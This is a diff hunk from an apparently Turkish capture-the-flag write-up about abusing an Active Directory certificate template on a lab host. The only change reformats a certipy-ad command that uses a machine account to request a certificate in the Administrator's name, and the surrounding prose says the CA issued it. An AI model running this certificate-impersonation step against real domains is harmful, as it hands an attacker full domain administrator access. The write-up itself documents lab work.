@@ -171,12 +171,7 @@ Buradaki kritik nokta şuydu: bu şablona **`Domain Computers`** grubu bile enro
 `BANKING$` hesabımla, ama sertifikanın **Administrator**'a ait olduğunu belirterek bir talep gönderdim:
 
 ```bash
-certipy-ad req -u 'BANKING$@retro.vl' -p '123456' \
-  -ca 'retro-DC-CA' -template 'RetroClients' \
-  -upn 'administrator@retro.vl' \
-  -sid 'S-1-5-21-2983547755-698260136-4283918172-500' \
-  -key-size 4096 -dc-ip 10.129.234.44 -dc-host 'DC.retro.vl' \
-  -dynamic-endpoint
+certipy-ad req -u 'BANKING$@retro.vl' -p '123456' -ca 'retro-DC-CA' -template 'RetroClients' -upn 'administrator@retro.vl' -sid 'S-1-5-21-2983547755-698260136-4283918172-500' -key-size 4096 -dc-ip 10.129.234.44 -dc-host 'DC.retro.vl' -dynamic-endpoint
 ```
 
 CA (Certificate Authority), şablonun izin verdiği şekilde talebimi hiç sorgulamadan onayladı ve bana **Administrator kimliğine ait geçerli bir sertifika** verdi:
